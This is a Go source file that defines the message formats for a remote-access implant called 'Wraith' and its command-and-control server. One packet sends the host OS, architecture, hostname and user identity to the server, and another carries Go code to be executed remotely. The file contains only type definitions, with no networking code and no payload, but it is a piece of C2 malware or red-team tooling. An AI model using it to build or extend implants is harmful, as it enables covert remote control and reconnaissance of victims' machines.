package proto

import "time"

// The structure of heartbeats which Wraiths send to c2 to register
// their status and presence.
type PacketRegReq struct {
	// A unique fingerprint of the family/strain this Wraith belongs to.
	StrainId string

	// The time when this Wraith was initialised.
	InitTime time.Time

	// A list of the names of modules installed in this Wraith.
	Modules []string

	// A list of the names of symbols avilable within this Wraith's
	// Go interpreter environment (only those passed to AdditionalSymbols).
	Symbols []string

	// The operating system Wraith is running on.
	HostOS string

	// The CPU architecture of the host.
	HostArch string

	// The system hostname.
	Hostname string

	// The name of the user under which Wraith is running.
	HostUser string

	// The ID of the user under which Wraith is running.
	HostUserId string
}

type PacketRegRes struct {
	// A JWT to identify this Wraith.
	Token string
}

type PacketCmdReq struct {
	// Go code to be executed.
	Exec []byte
}

type PacketCmdRes struct {
	// Result of the executed code.
	Result []byte
}